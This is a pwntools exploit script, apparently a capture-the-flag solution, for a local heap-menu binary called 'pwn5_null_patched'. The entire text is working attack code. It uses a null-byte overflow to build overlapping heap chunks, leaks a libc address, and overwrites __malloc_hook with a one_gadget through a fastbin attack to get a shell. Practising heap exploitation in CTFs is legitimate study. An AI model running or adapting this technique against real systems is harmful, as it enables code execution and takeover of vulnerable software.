from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./pwn5_null_patched', checksec=False)

p = process("./pwn5_null_patched")

#gdb.attach(p, gdbscript='''
#vis
#''')

def create(idx,size,data):
    p.sendafter(b">\n",b"1")
    p.sendafter(b"Index:",str(idx))
    p.sendafter(b"Input size:",str(size))
    p.sendafter(b"Input data:",data)

def show(idx):
    p.sendafter(b">\n",b"2")
    p.sendafter(b"Index:",str(idx))

def edit(index,newsize,data):
    p.sendafter(b">\n",b"3")
    p.sendafter(b"Input index:",str(index))
    p.sendlineafter(b"Input newsize:",str(newsize))
    p.sendlineafter(b"Do you want to change data (y/n)?\n",b"y")
    p.sendlineafter(b"Input data:",data)

def free(idx):
    p.sendafter(b">\n",b"4")
    p.sendafter(b"Input index:",str(idx))
  
    
create(0,0x88,b"\x00")
create(1,0x208,b"\x00")
create(2,0x88,b"\x00")
create(3,0x12,b"\x00")

free(1)
edit(0,0x88,p8(0)*0x88)
create(1,0xf8,b"\x00"*8)
create(4,0xf8,b"\x00"*8)
free(1)
free(2)

create(1,0xf8,b"a"*0xf7)
show(4)
p.recvuntil(b"Data = ")
leak=int.from_bytes(p.recv(6),"little")
libc=leak-0x39bb78
print("Libc_base: ",hex(libc))
malloc_hook=libc+0x39bb10
print("Malloc_hook: ",hex(malloc_hook-35))
one_gadget=libc+0x3f42a
print("Og_hook: ",hex(one_gadget))

create(5,0x68,b"b"*0x67)
free(5)
edit(4,0x68,p64(malloc_hook-35))
create(5,0x68,b"B")
create(6,0x68,b"B"*19+p64(one_gadget))
free(4)
free(6)

p.interactive()